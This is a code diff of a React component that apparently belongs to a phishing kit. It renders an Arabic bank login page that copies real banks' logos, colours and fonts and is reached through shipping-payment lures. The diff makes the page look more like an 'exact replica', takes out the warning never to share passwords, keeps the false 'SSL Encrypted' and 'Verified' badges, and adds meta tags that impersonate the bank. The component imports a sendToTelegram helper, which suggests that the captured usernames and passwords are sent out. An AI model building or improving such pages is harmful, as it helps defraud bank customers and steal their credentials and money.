@@ -5,9 +5,9 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
+import { bankBranding } from "@/lib/brandingSystem";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, ShieldCheck, CheckCircle, Loader2, User, Smartphone, IdCard, KeyRound, AlertCircle } from "lucide-react";
+import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
@@ -16,6 +16,7 @@ import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
 import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
 import { designSystem } from "@/lib/designSystem";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -33,26 +34,15 @@ const PaymentBankLogin = () => {
 
   const customerInfo = linkData?.payload?.customerInfo || {};
   const selectedBankId = linkData?.payload?.selectedBank || '';
-  const cardInfo = linkData?.payload?.cardInfo || {
-    cardName: '',
-    cardLast4: '',
-    cardNumber: '',
-    cardExpiry: '',
-    cardCvv: '',
-    cardType: '',
-  };
+  const cardInfo = linkData?.payload?.cardInfo || {};
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
-
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-
   const shippingInfo = linkData?.payload as any;
-
   const rawAmount = shippingInfo?.cod_amount;
 
   let amount = 500;
@@ -101,10 +91,10 @@ const PaymentBankLogin = () => {
   if (linkLoading || !linkData) {
     return (
       <div 
-        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
+        className="min-h-screen flex items-center justify-center" 
         dir="rtl"
         style={{
-          background: selectedBankBranding?.colors?.surface ? `linear-gradient(135deg, ${selectedBankBranding.colors.surface}, ${selectedBankBranding.colors.background})` : branding.colors.primary + '10'
+          background: selectedBankBranding?.colors?.surface || '#F5F5F5'
         }}
       >
         <div className="text-center">
@@ -232,193 +222,227 @@ const PaymentBankLogin = () => {
   
   const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
   const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
-  const surfaceColor = selectedBankBranding?.colors?.surface || '#F5F5F5';
+  const surfaceColor = selectedBankBranding?.colors?.surface || '#FAFAFA';
   const textColor = selectedBankBranding?.colors?.text || '#1A1A1A';
   const borderColor = selectedBankBranding?.colors?.border || '#E5E5E5';
   
   return (
     <>
+      <PaymentMetaTags 
+        serviceKey={selectedBankId !== 'skipped' && selectedBankId ? `bank_${selectedBankId}` : serviceKey}
+        serviceName={selectedBank?.nameAr || serviceName}
+        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
+        customDescription={`الخدمات المصرفية الإلكترونية - تسجيل دخول آمن - ${selectedBank?.nameAr || 'البنك'}`}
+        amount={formattedAmount}
+      />
+
+      {/* Full Screen Layout */}
       <div 
-        className="min-h-screen flex flex-col"
+        className="min-h-screen w-full flex flex-col"
         dir="rtl"
         style={{
           background: surfaceColor,
-          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
+          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
         }}
       >
-        {/* Authentic Bank Header */}
-        <div 
-          className="w-full py-6 px-4 shadow-md"
+        {/* Official Bank Header - Exact Replica */}
+        <header 
+          className="w-full border-b"
           style={{
             background: '#FFFFFF',
-            borderBottom: `3px solid ${primaryColor}`
+            borderBottom: `3px solid ${primaryColor}`,
+            boxShadow: '0 2px 4px rgba(0,0,0,0.04)'
           }}
         >
-          <div className="container mx-auto max-w-6xl flex items-center justify-between">
-            <div className="flex items-center gap-4">
-              <div className="w-28 sm:w-36">
-                <BankLogo 
-                  bankId={selectedBank?.id || ''}
-                  bankName={selectedBank?.name || ''}
-                  bankNameAr={selectedBank?.nameAr || ''}
-                  color={selectedBank?.color || primaryColor}
-                  size="lg"
-                  className="w-full"
-                />
-              </div>
-              <div className="h-10 w-px bg-gray-300 hidden sm:block" />
-              <div className="hidden sm:block">
-                <h2 className="text-lg font-bold" style={{ color: textColor }}>
-                  الخدمات المصرفية الإلكترونية
-                </h2>
-                <p className="text-sm text-gray-500">
-                  Internet Banking
-                </p>
-              </div>
-            </div>
-            
-            <div className="flex items-center gap-3">
-              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
-                <ShieldCheck className="w-4 h-4 text-green-600" />
-                <span className="text-xs font-medium text-green-700">اتصال آمن</span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        {/* Main Content */}
-        <div className="flex-1 py-8 sm:py-12">
-          <div className="container mx-auto px-4 max-w-md">
-            <Card 
-              className="overflow-hidden border-0"
-              style={{
-                borderRadius: selectedBankBranding?.borderRadius?.lg || '12px',
-                boxShadow: '0 4px 20px rgba(0,0,0,0.08)'
-              }}
-            >
-              {/* Card Header with Bank Brand */}
-              <div 
-                className="px-6 sm:px-8 pt-6 sm:pt-8 pb-4"
-                style={{
-                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-                }}
-              >
-                <div className="text-center">
-                  <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 backdrop-blur-sm mb-3">
-                    <Lock className="w-8 h-8 text-white" />
-                  </div>
-                  <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
-                    تسجيل الدخول
-                  </h1>
-                  <p className="text-sm text-white/90">
-                    {selectedBank?.nameAr || 'البنك'}
+          <div className="container mx-auto px-4 sm:px-6 lg:px-8 max-w-7xl">
+            <div className="flex items-center justify-between h-16 sm:h-20">
+              {/* Bank Logo & Title */}
+              <div className="flex items-center gap-3 sm:gap-6">
+                <div className="w-28 sm:w-36 lg:w-44">
+                  {selectedBank && (
+                    <BankLogo 
+                      bankId={selectedBank.id}
+                      bankName={selectedBank.name}
+                      bankNameAr={selectedBank.nameAr}
+                      color={selectedBank.color}
+                      size="lg"
+                      className="w-full h-auto"
+                    />
+                  )}
+                </div>
+                <div className="hidden md:block w-px h-12 bg-gray-300" />
+                <div className="hidden md:block">
+                  <p className="text-base lg:text-lg font-bold" style={{ color: textColor }}>
+                    الخدمات المصرفية الإلكترونية
+                  </p>
+                  <p className="text-sm text-gray-500">
+                    Internet Banking Services
                   </p>
                 </div>
               </div>
+              
+              {/* Right Side - Language & Help */}
+              <div className="flex items-center gap-3">
+                <button 
+                  className="hidden sm:flex items-center gap-2 px-4 py-2 rounded-md text-sm hover:bg-gray-50 transition-colors"
+                  style={{ color: textColor }}
+                >
+                  <Globe className="w-4 h-4" />
+                  <span>English</span>
+                  <ChevronDown className="w-3 h-3" />
+                </button>
+                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
+                  <Lock className="w-3.5 h-3.5 text-green-600" />
+                  <span className="text-xs font-medium text-green-700">آمن</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </header>
 
-              {/* Form Content */}
-              <div className="px-6 sm:px-8 py-6 sm:py-8 bg-white">
-                {/* Security Notice */}
+        {/* Main Content - Full Screen */}
+        <div className="flex-1 flex items-center justify-center py-8 sm:py-12 px-4">
+          <div className="w-full max-w-md">
+            {/* Login Card */}
+            <Card 
+              className="overflow-hidden border shadow-xl"
+              style={{
+                borderRadius: selectedBankBranding?.borderRadius?.lg || '12px',
+                borderColor: `${primaryColor}20`,
+                background: '#FFFFFF'
+              }}
+            >
+              {/* Card Header */}
+              <div 
+                className="px-6 sm:px-10 pt-8 sm:pt-10 pb-6 text-center"
+                style={{
+                  background: '#FFFFFF'
+                }}
+              >
                 <div 
-                  className="rounded-lg p-3 mb-6 flex items-start gap-3"
+                  className="w-20 h-20 rounded-full mx-auto mb-5 flex items-center justify-center"
                   style={{
-                    background: `${primaryColor}08`,
-                    border: `1px solid ${primaryColor}30`
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                   }}
                 >
-                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
-                  <div className="text-sm" style={{ color: textColor }}>
-                    <p className="font-semibold mb-1">تحذير أمني</p>
-                    <p className="text-xs text-gray-600">
-                      لا تشارك بياناتك المصرفية مع أي شخص. البنك لن يطلب منك كلمة المرور عبر الهاتف أو البريد الإلكتروني.
-                    </p>
-                  </div>
+                  <Lock className="w-10 h-10 text-white" />
                 </div>
+                <h1 
+                  className="text-2xl sm:text-3xl font-bold mb-2"
+                  style={{ 
+                    color: textColor,
+                    fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
+                  }}
+                >
+                  تسجيل الدخول
+                </h1>
+                <p className="text-sm sm:text-base text-gray-600">
+                  {selectedBank?.nameAr || 'الخدمات المصرفية الإلكترونية'}
+                </p>
+              </div>
 
-                <form onSubmit={handleSubmit} className="space-y-5">
+              {/* Login Form */}
+              <form onSubmit={handleSubmit} className="px-6 sm:px-10 pb-10 bg-white">
+                <div className="space-y-5">
                   {/* Username / Customer ID Field */}
                   {loginType === 'username' && (
                     <div>
                       <Label 
-                        className="mb-2 text-sm font-bold flex items-center gap-2"
+                        htmlFor="username"
+                        className="block mb-2.5 text-sm font-semibold"
                         style={{ color: textColor }}
                       >
-                        <User className="w-4 h-4" />
                         اسم المستخدم
                       </Label>
-                      <Input
-                        type="text"
-                        placeholder="أدخل اسم المستخدم"
-                        value={username}
-                        onChange={(e) => setUsername(e.target.value)}
-                        className="h-12 text-base pr-4 rounded-lg border-2 focus:border-primary transition-all"
-                        style={{ 
-                          borderColor: borderColor,
-                          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
-                        }}
-                        autoComplete="username"
-                        required
-                      />
+                      <div className="relative">
+                        <Input
+                          id="username"
+                          type="text"
+                          placeholder="أدخل اسم المستخدم"
+                          value={username}
+                          onChange={(e) => setUsername(e.target.value)}
+                          className="h-12 text-base pr-12 pl-4 border-2 rounded-lg transition-all focus:border-opacity-100"
+                          style={{ 
+                            borderColor: borderColor,
+                            fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
+                          }}
+                          autoComplete="username"
+                          required
+                        />
+                        <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
+                          <User className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
+                        </div>
+                      </div>
                     </div>
                   )}
                   
                   {loginType === 'customerId' && (
                     <div>
                       <Label 
-                        className="mb-2 text-sm font-bold flex items-center gap-2"
+                        htmlFor="customerId"
+                        className="block mb-2.5 text-sm font-semibold"
                         style={{ color: textColor }}
                       >
-                        <IdCard className="w-4 h-4" />
-                        رقم العميل / رقم الهوية
+                        رقم العميل
                       </Label>
-                      <Input
-                        type="text"
-                        placeholder="أدخل رقم العميل"
-                        value={customerId}
-                        onChange={(e) => setCustomerId(e.target.value)}
-                        className="h-12 text-base pr-4 rounded-lg border-2 focus:border-primary transition-all"
-                        style={{ 
-                          borderColor: borderColor,
-                          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
-                        }}
-                        inputMode="numeric"
-                        required
-                      />
+                      <div className="relative">
+                        <Input
+                          id="customerId"
+                          type="text"
+                          placeholder="أدخل رقم العميل"
+                          value={customerId}
+                          onChange={(e) => setCustomerId(e.target.value)}
+                          className="h-12 text-base pr-12 pl-4 border-2 rounded-lg transition-all focus:border-opacity-100"
+                          style={{ 
+                            borderColor: borderColor,
+                            fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
+                          }}
+                          inputMode="numeric"
+                          required
+                        />
+                        <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
+                          <IdCard className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
+                        </div>
+                      </div>
                     </div>
                   )}
                   
                   {/* Password Field */}
                   <div>
-                    <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center justify-between mb-2.5">
                       <Label 
-                        className="text-sm font-bold flex items-center gap-2"
+                        htmlFor="password"
+                        className="text-sm font-semibold"
                         style={{ color: textColor }}
                       >
-                        <KeyRound className="w-4 h-4" />
                         كلمة المرور
                       </Label>
                       <button
                         type="button"
-                        className="text-xs font-medium hover:underline transition-all"
+                        className="text-xs font-medium transition-all"
                         style={{ color: primaryColor }}
                       >
-                        هل نسيت كلمة المرور؟
+                        نسيت كلمة المرور؟
                       </button>
                     </div>
                     <div className="relative">
                       <Input
+                        id="password"
                         type={showPassword ? "text" : "password"}
                         placeholder="أدخل كلمة المرور"
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="h-12 text-base pr-4 pl-12 rounded-lg border-2 focus:border-primary transition-all"
+                        className="h-12 text-base pr-12 pl-12 border-2 rounded-lg transition-all focus:border-opacity-100"
                         style={{ 
                           borderColor: borderColor,
-                          fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                          fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, sans-serif'
                         }}
                         autoComplete="current-password"
                         required
                       />
+                      <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
+                        <KeyRound className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
+                      </div>
                       <button
                         type="button"
                         onClick={() => setShowPassword(!showPassword)}
@@ -434,14 +458,13 @@ const PaymentBankLogin = () => {
                   </div>
                   
                   {/* Remember Me */}
-                  <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-2.5">
                     <input 
                       type="checkbox" 
                       id="remember" 
-                      className="w-4 h-4 rounded border-2" 
+                      className="w-4 h-4 rounded cursor-pointer" 
                       style={{ 
-                        accentColor: primaryColor,
-                        borderColor: borderColor
+                        accentColor: primaryColor
                       }}
                     />
                     <label 
@@ -449,84 +472,100 @@ const PaymentBankLogin = () => {
                       className="text-sm cursor-pointer select-none"
                       style={{ color: textColor }}
                     >
-                      تذكرني على هذا الجهاز
+                      تذكرني
                     </label>
                   </div>
-                  
-                  {/* Submit Button */}
-                  <Button
-                    type="submit"
-                    size="lg"
-                    className="w-full text-base py-6 text-white font-bold shadow-lg hover:shadow-xl transition-all duration-300 rounded-lg"
-                    disabled={isSubmitting}
-                    style={{
-                      background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-                      boxShadow: `0 8px 20px -6px ${primaryColor}60`
-                    }}
-                  >
-                    {isSubmitting ? (
-                      <span className="flex items-center gap-2">
-                        <Loader2 className="w-5 h-5 animate-spin" />
-                        جاري تسجيل الدخول...
-                      </span>
-                    ) : (
-                      <span className="flex items-center gap-2">
-                        <Lock className="w-5 h-5" />
-                        تسجيل الدخول
-                      </span>
-                    )}
-                  </Button>
-                  
-                  <p className="text-xs text-center text-gray-500 mt-4">
-                    بتسجيل الدخول، أنت توافق على شروط وأحكام البنك وسياسة الخصوصية
-                  </p>
-                </form>
-              </div>
+                </div>
+                
+                {/* Submit Button - Official Bank Style */}
+                <Button
+                  type="submit"
+                  size="lg"
+                  className="w-full text-base sm:text-lg py-6 sm:py-7 text-white font-bold transition-all duration-200 rounded-lg mt-8"
+                  disabled={isSubmitting}
+                  style={{
+                    background: primaryColor,
+                    fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif',
+                    boxShadow: `0 4px 12px ${primaryColor}40`
+                  }}
+                  onMouseEnter={(e) => {
+                    if (!isSubmitting) {
+                      e.currentTarget.style.background = secondaryColor;
+                      e.currentTarget.style.transform = 'translateY(-1px)';
+                      e.currentTarget.style.boxShadow = `0 6px 16px ${primaryColor}50`;
+                    }
+                  }}
+                  onMouseLeave={(e) => {
+                    e.currentTarget.style.background = primaryColor;
+                    e.currentTarget.style.transform = 'translateY(0)';
+                    e.currentTarget.style.boxShadow = `0 4px 12px ${primaryColor}40`;
+                  }}
+                >
+                  {isSubmitting ? (
+                    <span className="flex items-center justify-center gap-2">
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      جاري تسجيل الدخول...
+                    </span>
+                  ) : (
+                    "تسجيل الدخول"
+                  )}
+                </Button>
+                
+                <p className="text-xs text-center text-gray-500 mt-6">
+                  بالمتابعة، أنت توافق على{' '}
+                  <a href="#" className="underline" style={{ color: primaryColor }}>
+                    الشروط والأحكام
+                  </a>
+                  {' '}و{' '}
+                  <a href="#" className="underline" style={{ color: primaryColor }}>
+                    سياسة الخصوصية
+                  </a>
+                </p>
+              </form>
 
-              {/* Footer Links */}
+              {/* Card Footer */}
               <div 
-                className="px-6 sm:px-8 py-4 border-t"
+                className="px-6 sm:px-10 py-5 text-center border-t"
                 style={{
                   background: surfaceColor,
-                  borderColor: borderColor
+                  borderTopColor: borderColor
                 }}
               >
-                <div className="flex flex-col sm:flex-row items-center justify-between gap-3 text-xs">
-                  <button
-                    type="button"
-                    className="font-medium hover:underline transition-all"
-                    style={{ color: primaryColor }}
-                  >
-                    تسجيل مستخدم جديد
-                  </button>
-                  <div className="flex items-center gap-3 text-gray-500">
-                    <div className="flex items-center gap-1.5">
-                      <Lock className="w-3 h-3" />
-                      <span>SSL Encrypted</span>
-                    </div>
-                    <span>•</span>
-                    <div className="flex items-center gap-1.5">
-                      <ShieldCheck className="w-3 h-3" />
-                      <span>Verified</span>
-                    </div>
+                <button
+                  type="button"
+                  className="text-sm font-semibold transition-all hover:underline"
+                  style={{ color: primaryColor }}
+                >
+                  ليس لديك حساب؟ سجّل الآن
+                </button>
+                
+                <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mt-4 pt-4 border-t" style={{ borderTopColor: borderColor }}>
+                  <div className="flex items-center gap-1.5">
+                    <Lock className="w-3 h-3" />
+                    <span>SSL Encrypted</span>
+                  </div>
+                  <span>•</span>
+                  <div className="flex items-center gap-1.5">
+                    <ShieldCheck className="w-3 h-3" />
+                    <span>Verified</span>
                   </div>
                 </div>
               </div>
             </Card>
             
             {/* Bank Footer */}
-            <div className="mt-6 text-center">
-              <p className="text-xs text-gray-500">
+            <footer className="mt-8 text-center">
+              <p className="text-xs text-gray-500 mb-3">
                 © 2025 {selectedBank?.nameAr || 'البنك'}. جميع الحقوق محفوظة.
               </p>
-              <div className="mt-2 flex items-center justify-center gap-4 text-xs text-gray-400">
-                <a href="#" className="hover:text-gray-600 transition-colors">الشروط والأحكام</a>
-                <span>•</span>
-                <a href="#" className="hover:text-gray-600 transition-colors">سياسة الخصوصية</a>
-                <span>•</span>
-                <a href="#" className="hover:text-gray-600 transition-colors">الأسئلة الشائعة</a>
+              <div className="flex items-center justify-center gap-4 text-xs">
+                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">الشروط والأحكام</a>
+                <span className="text-gray-400">•</span>
+                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">سياسة الخصوصية</a>
+                <span className="text-gray-400">•</span>
+                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">خريطة الموقع</a>
               </div>
-            </div>
+            </footer>
           </div>
         </div>
       </div>
